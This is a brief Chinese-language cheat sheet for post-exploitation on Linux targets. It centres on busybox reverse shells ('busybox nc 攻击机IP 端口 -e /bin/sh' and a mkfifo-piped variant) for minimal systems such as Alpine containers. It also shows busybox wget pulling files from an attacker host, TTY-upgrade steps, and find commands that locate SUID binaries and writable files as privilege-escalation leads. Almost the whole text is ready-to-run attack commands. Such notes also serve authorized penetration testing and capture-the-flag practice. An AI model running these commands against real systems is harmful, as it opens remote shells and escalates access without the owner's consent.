反弹shell

考虑busybox反弹shell的情况

  • 靶机没有nc、ncat等反弹shell工具
  • 阉割版nc，不具备反弹shell功能
  • sh、bash反弹shell管道存在问题
  • 使用Alpine Linux做基础镜像的容器，工具较少
busybox nc 攻击机IP 端口 -e /bin/sh 
# 创建命名管道
busybox mkfifo /tmp/f
/bin/sh -i 2>&1 < /tmp/f | busybox nc 攻击者IP 端口 > /tmp/f

busybox wget下载远程文件

busybox wget http://攻击机IP/文件 -O /本地路径/文件

行列数计算

stty -a|grep 'row'|awk -F'[ ;]+' '{print "stty "$4,$5,$6,$7}'
script /dev/null -c bash
# 按下 Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
# 此处使用上面计算行列数的结果
stty rows 44 columns 208

文件查找

快速定位到近期变动的文件，以及一些潜在的提权点。

find / -perm -4000  2>/dev/null

# 查找最近7天创建的文件
find / -ctime -7 2>/dev/null | grep -Ev '^(/dev|/proc|/sys|/run|/var/lib|/var/run)'

# 查找最近7天修改的文件
find / -mtime -7 2>/dev/null | grep -Ev '^(/dev|/proc|/sys|/run|/var/lib|/var/run)'

# 查找可写文件
find / -type f -writable 2>/dev/null | grep -Ev '^(/dev|/proc|/sys|/run|/var/lib|/var/run)'

# 查找可写目录
find / -type d -writable 2>/dev/null | grep -Ev '^(/dev|/proc|/sys|/run|/var/lib|/var/run)'

# 查找suid文件
find / -perm -4000 -type f 2>/dev/null
